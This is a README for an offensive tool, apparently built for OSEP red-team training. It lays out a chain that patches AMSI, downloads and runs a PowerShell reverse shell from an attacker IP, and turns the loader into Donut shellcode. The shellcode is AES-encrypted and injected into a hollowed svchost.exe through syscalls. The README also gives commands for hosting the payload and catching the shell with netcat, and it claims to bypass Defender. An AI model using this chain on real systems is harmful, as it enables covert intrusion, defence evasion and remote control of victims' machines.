# Stealth-Shellcode-Runner

# 🔒 Advanced Shellcode Execution via Process Hollowing and AES Encryption

This project demonstrates a stealthy approach to executing an AES-encrypted PowerShell reverse shell using a custom C# loader, `donut` for shellcode generation, and a custom runner using **partial indirect syscalls** and **process hollowing** techniques.

---

## 🧩 Step 1 - Build the PowerShell Loader (`Project_Stealth.cs`)

Create a minimal C# console project and include the following logic to:

- Patch AMSI via `.NET Reflection`
- Download and execute a PowerShell payload (e.g., reverse shell)
- Use base64 obfuscation for script names

📌 **Note:** You must manually add a reference to:
```
C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
```

### Core logic:
```csharp
string attackerIP = "192.168.1.94";
PatchAMSI();
string psUrl = $"http://{attackerIP}/shell.ps1";
string psScript = GetStringFromUrl(psUrl);
ExecutePowerShell(psScript);
```

---

## 🧪 Step 2 - Generate Shellcode with Donut

Use [Donut](https://github.com/TheWover/donut) to convert the compiled loader into shellcode:

```bash
.\donut.exe -i "Project_Stealth.exe" -a 2 -f 1 -o shellcode.bin
```

- `-a 2`: Target .NET assemblies
- `-f 1`: Run the .NET assembly as unmanaged shellcode

---

## 🔐 Step 3 - AES Encrypt the Shellcode

Use the Python script to AES-encrypt the generated shellcode.

Paste the generated arrays into your Process Hollowing runner.

---

## 🧠 Step 4 - Execute with Process Hollowing + Partial Indirect Syscalls

Use the included `ShellCode_Runner.cs` script to:

- Create a suspended process (`svchost.exe`)
- Allocate RWX memory via partially indirect syscall
- Decrypt and write the AES-encrypted shellcode
- Change protection and execute via `NtCreateThreadEx`

> Note: Only `NtAllocateVirtualMemory` uses an indirect syscall via a memory stub. Other syscalls (`NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx`) are still invoked via direct P/Invoke.

📌 Replace the following placeholders with your actual AES-encrypted shellcode and keys:

```csharp
byte[] encryptedShellcode = new byte[] { ... };
byte[] aesKey = new byte[] { ... };
byte[] aesIV = new byte[] { ... };
```

---

## 🖥️ Hosting the Reverse Shell Payload

The PowerShell reverse shell is hosted in a file named `shell.ps1`.


Then serve the file using Python's HTTP server from the directory containing `shell.ps1`:

```bash
python3 -m http.server 80
```

---

## 📡 Setting Up the Listener

Use `rlwrap` with `netcat` to handle a fully interactive reverse shell:

```bash
rlwrap -cAr nc -lnvp 443
```

---

## ✅ Final Outcome

- AMSI is silently patched
- PowerShell payload is downloaded and executed in memory
- Shellcode is decrypted and injected into a remote process
- Connection established with full interactivity
- Tested and working in OSEP lab environments with Defender enabled

---

**Built for OSEP training and red team lab use. Not intended for real-world offensive operations without proper authorization.**
